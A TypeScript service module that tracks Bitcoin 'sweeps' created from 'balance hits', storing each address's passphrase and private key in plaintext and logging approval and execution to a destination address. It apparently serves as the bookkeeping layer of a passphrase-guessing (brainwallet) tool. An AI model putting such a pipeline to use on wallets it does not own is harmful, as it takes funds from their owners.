import { db, withDbRetry } from "./db";
import { 
  pendingSweeps, 
  sweepAuditLog, 
  balanceHits,
  type PendingSweep, 
  type InsertPendingSweep,
  type SweepAuditLog,
  type InsertSweepAuditLog,
  type SweepStatus 
} from "@shared/schema";
import { eq, desc, sql } from "drizzle-orm";

export interface PendingSweepRecord {
  id: string;
  address: string;
  passphrase: string;
  wif: string;
  isCompressed: boolean;
  balanceSats: number;
  balanceBtc: string;
  estimatedFeeSats: number | null;
  netAmountSats: number | null;
  utxoCount: number | null;
  status: string;
  source: string | null;
  recoveryType: string | null;
  txHex: string | null;
  txId: string | null;
  destinationAddress: string | null;
  errorMessage: string | null;
  discoveredAt: Date;
  approvedAt: Date | null;
  approvedBy: string | null;
  broadcastAt: Date | null;
  completedAt: Date | null;
  createdAt: Date | null;
  updatedAt: Date | null;
}

export interface SweepAuditLogRecord {
  id: string;
  sweepId: string | null;
  action: string;
  previousStatus: string | null;
  newStatus: string | null;
  actor: string | null;
  details: string | null;
  timestamp: Date;
}

export interface SweepStats {
  pendingCount: number;
  approvedCount: number;
  executedCount: number;
  rejectedCount: number;
  failedCount: number;
  totalPendingValueSats: number;
  totalPendingValueBtc: string;
  totalExecutedValueSats: number;
  totalExecutedValueBtc: string;
}

export interface CreatePendingSweepResult {
  success: boolean;
  sweep?: PendingSweep;
  error?: string;
}

export interface SweepOperationResult {
  success: boolean;
  error?: string;
  sweep?: PendingSweep;
  txHash?: string;
}

class SweepApprovalServiceImpl {
  constructor() {
    console.log("[SweepApprovalService] Initialized");
  }

  async createPendingSweep(
    balanceHitId: string | null,
    address: string,
    passphrase: string,
    wif: string,
    balanceSats: number
  ): Promise<CreatePendingSweepResult> {
    if (!db) {
      return { success: false, error: "Database not available" };
    }

    try {
      const existingResult = await withDbRetry(
        async () => {
          return await db!
            .select()
            .from(pendingSweeps)
            .where(eq(pendingSweeps.address, address))
            .limit(1);
        },
        'check-existing-sweep'
      );

      if (existingResult && existingResult.length > 0) {
        const existing = existingResult[0];
        if (existing.status === 'pending' || existing.status === 'approved') {
          return { 
            success: false, 
            error: `Sweep already exists for address with status: ${existing.status}`,
            sweep: existing
          };
        }
      }

      const balanceBtc = (balanceSats / 100000000).toFixed(8);

      const insertData: InsertPendingSweep = {
        address,
        passphrase,
        wif,
        isCompressed: true,
        balanceSats,
        balanceBtc,
        status: "pending",
        source: "typescript",
      };

      const result = await withDbRetry(
        async () => {
          const [inserted] = await db!
            .insert(pendingSweeps)
            .values(insertData)
            .returning();
          return inserted;
        },
        'insert-pending-sweep'
      );

      if (!result) {
        return { success: false, error: "Failed to insert pending sweep" };
      }

      await this.logAuditEvent({
        sweepId: result.id,
        action: "created",
        previousStatus: null,
        newStatus: "pending",
        actor: "system",
        details: `Created from balance hit ${balanceHitId || 'unknown'}. Balance: ${balanceBtc} BTC (${balanceSats} sats)`,
      });

      console.log(`[SweepApprovalService] Created pending sweep for ${address.slice(0, 15)}... with ${balanceBtc} BTC`);

      return { success: true, sweep: result };
    } catch (error) {
      console.error("[SweepApprovalService] Error creating pending sweep:", error);
      return { 
        success: false, 
        error: error instanceof Error ? error.message : "Unknown error" 
      };
    }
  }

  async approveSweep(
    sweepId: string,
    approvedBy: string,
    notes?: string
  ): Promise<SweepOperationResult> {
    if (!db) {
      return { success: false, error: "Database not available" };
    }

    try {
      const sweep = await this.getSweepById(sweepId);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "pending") {
        return { 
          success: false, 
          error: `Cannot approve sweep with status: ${sweep.status}. Only pending sweeps can be approved.` 
        };
      }

      const updateResult = await withDbRetry(
        async () => {
          const [updated] = await db!
            .update(pendingSweeps)
            .set({
              status: "approved",
              approvedAt: new Date(),
              approvedBy,
              updatedAt: new Date(),
            })
            .where(eq(pendingSweeps.id, sweepId))
            .returning();
          return updated;
        },
        'approve-sweep'
      );

      if (!updateResult) {
        return { success: false, error: "Failed to update sweep status" };
      }

      await this.logAuditEvent({
        sweepId,
        action: "approved",
        previousStatus: "pending",
        newStatus: "approved",
        actor: approvedBy,
        details: notes || `Approved by ${approvedBy}`,
      });

      console.log(`[SweepApprovalService] Sweep ${sweepId} approved by ${approvedBy}`);

      return { success: true, sweep: updateResult };
    } catch (error) {
      console.error("[SweepApprovalService] Error approving sweep:", error);
      return { 
        success: false, 
        error: error instanceof Error ? error.message : "Unknown error" 
      };
    }
  }

  async rejectSweep(
    sweepId: string,
    rejectedBy: string,
    reason: string
  ): Promise<SweepOperationResult> {
    if (!db) {
      return { success: false, error: "Database not available" };
    }

    try {
      const sweep = await this.getSweepById(sweepId);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "pending" && sweep.status !== "approved") {
        return { 
          success: false, 
          error: `Cannot reject sweep with status: ${sweep.status}. Only pending or approved sweeps can be rejected.` 
        };
      }

      const previousStatus = sweep.status;

      const updateResult = await withDbRetry(
        async () => {
          const [updated] = await db!
            .update(pendingSweeps)
            .set({
              status: "rejected",
              errorMessage: reason,
              updatedAt: new Date(),
            })
            .where(eq(pendingSweeps.id, sweepId))
            .returning();
          return updated;
        },
        'reject-sweep'
      );

      if (!updateResult) {
        return { success: false, error: "Failed to update sweep status" };
      }

      await this.logAuditEvent({
        sweepId,
        action: "rejected",
        previousStatus,
        newStatus: "rejected",
        actor: rejectedBy,
        details: reason,
      });

      console.log(`[SweepApprovalService] Sweep ${sweepId} rejected by ${rejectedBy}: ${reason}`);

      return { success: true, sweep: updateResult };
    } catch (error) {
      console.error("[SweepApprovalService] Error rejecting sweep:", error);
      return { 
        success: false, 
        error: error instanceof Error ? error.message : "Unknown error" 
      };
    }
  }

  async executeSweep(
    sweepId: string,
    destinationAddress: string,
    txHash: string,
    networkFee: number
  ): Promise<SweepOperationResult> {
    if (!db) {
      return { success: false, error: "Database not available" };
    }

    try {
      const sweep = await this.getSweepById(sweepId);
      if (!sweep) {
        return { success: false, error: "Sweep not found" };
      }

      if (sweep.status !== "approved") {
        return { 
          success: false, 
          error: `Cannot execute sweep with status: ${sweep.status}. Sweep must be approved first.` 
        };
      }

      const netAmountSats = sweep.balanceSats - networkFee;

      const updateResult = await withDbRetry(
        async () => {
          const [updated] = await db!
            .update(pendingSweeps)
            .set({
              status: "completed",
              txId: txHash,
              destinationAddress,
              estimatedFeeSats: networkFee,
              netAmountSats,
              completedAt: new Date(),
              updatedAt: new Date(),
            })
            .where(eq(pendingSweeps.id, sweepId))
            .returning();
          return updated;
        },
        'execute-sweep'
      );

      if (!updateResult) {
        return { success: false, error: "Failed to update sweep status" };
      }

      await this.logAuditEvent({
        sweepId,
        action: "executed",
        previousStatus: "approved",
        newStatus: "completed",
        actor: "system",
        details: `Executed to ${destinationAddress}. TX: ${txHash}. Fee: ${networkFee} sats. Net: ${netAmountSats} sats`,
      });

      console.log(`[SweepApprovalService] Sweep ${sweepId} executed. TX: ${txHash}`);

      return { success: true, sweep: updateResult, txHash };
    } catch (error) {
      console.error("[SweepApprovalService] Error executing sweep:", error);
      return { 
        success: false, 
        error: error instanceof Error ? error.message : "Unknown error" 
      };
    }
  }

  async getPendingSweeps(status?: SweepStatus): Promise<PendingSweep[]> {
    if (!db) return [];

    try {
      const result = await withDbRetry(
        async () => {
          if (status) {
            return await db!
              .select()
              .from(pendingSweeps)
              .where(eq(pendingSweeps.status, status))
              .orderBy(desc(pendingSweeps.balanceSats));
          }
          return await db!
            .select()
            .from(pendingSweeps)
            .orderBy(desc(pendingSweeps.discoveredAt));
        },
        'get-pending-sweeps'
      );

      return result || [];
    } catch (error) {
      console.error("[SweepApprovalService] Error getting pending sweeps:", error);
      return [];
    }
  }

  async getSweepById(sweepId: string): Promise<PendingSweep | null> {
    if (!db) return null;

    try {
      const result = await withDbRetry(
        async () => {
          const [row] = await db!
            .select()
            .from(pendingSweeps)
            .where(eq(pendingSweeps.id, sweepId))
            .limit(1);
          return row || null;
        },
        'get-sweep-by-id'
      );

      return result;
    } catch (error) {
      console.error("[SweepApprovalService] Error getting sweep by id:", error);
      return null;
    }
  }

  async getSweepAuditLog(sweepId: string): Promise<SweepAuditLog[]> {
    if (!db) return [];

    try {
      const result = await withDbRetry(
        async () => {
          return await db!
            .select()
            .from(sweepAuditLog)
            .where(eq(sweepAuditLog.sweepId, sweepId))
            .orderBy(desc(sweepAuditLog.timestamp));
        },
        'get-sweep-audit-log'
      );

      return result || [];
    } catch (error) {
      console.error("[SweepApprovalService] Error getting audit log:", error);
      return [];
    }
  }

  async getSweepStats(): Promise<SweepStats> {
    const defaultStats: SweepStats = {
      pendingCount: 0,
      approvedCount: 0,
      executedCount: 0,
      rejectedCount: 0,
      failedCount: 0,
      totalPendingValueSats: 0,
      totalPendingValueBtc: "0.00000000",
      totalExecutedValueSats: 0,
      totalExecutedValueBtc: "0.00000000",
    };

    if (!db) return defaultStats;

    try {
      const result = await withDbRetry(
        async () => {
          return await db!
            .select({
              status: pendingSweeps.status,
              count: sql<number>`count(*)::int`,
              totalSats: sql<number>`COALESCE(sum(${pendingSweeps.balanceSats}), 0)::bigint`,
            })
            .from(pendingSweeps)
            .groupBy(pendingSweeps.status);
        },
        'get-sweep-stats'
      );

      if (!result) return defaultStats;

      const stats = { ...defaultStats };
      let pendingSats = 0;
      let executedSats = 0;

      for (const row of result) {
        const count = Number(row.count);
        const totalSats = Number(row.totalSats);

        switch (row.status) {
          case "pending":
            stats.pendingCount = count;
            pendingSats += totalSats;
            break;
          case "approved":
            stats.approvedCount = count;
            pendingSats += totalSats;
            break;
          case "completed":
            stats.executedCount = count;
            executedSats += totalSats;
            break;
          case "rejected":
            stats.rejectedCount = count;
            break;
          case "failed":
            stats.failedCount = count;
            break;
        }
      }

      stats.totalPendingValueSats = pendingSats;
      stats.totalPendingValueBtc = (pendingSats / 100000000).toFixed(8);
      stats.totalExecutedValueSats = executedSats;
      stats.totalExecutedValueBtc = (executedSats / 100000000).toFixed(8);

      return stats;
    } catch (error) {
      console.error("[SweepApprovalService] Error getting stats:", error);
      return defaultStats;
    }
  }

  private async logAuditEvent(event: {
    sweepId: string;
    action: string;
    previousStatus: string | null;
    newStatus: string;
    actor: string;
    details: string;
  }): Promise<void> {
    if (!db) return;

    try {
      await withDbRetry(
        async () => {
          await db!.insert(sweepAuditLog).values({
            sweepId: event.sweepId,
            action: event.action,
            previousStatus: event.previousStatus,
            newStatus: event.newStatus,
            actor: event.actor,
            details: event.details,
          });
        },
        'insert-audit-log'
      );
    } catch (error) {
      console.error("[SweepApprovalService] Error logging audit event:", error);
    }
  }
}

export const sweepApprovalServiceV2 = new SweepApprovalServiceImpl();
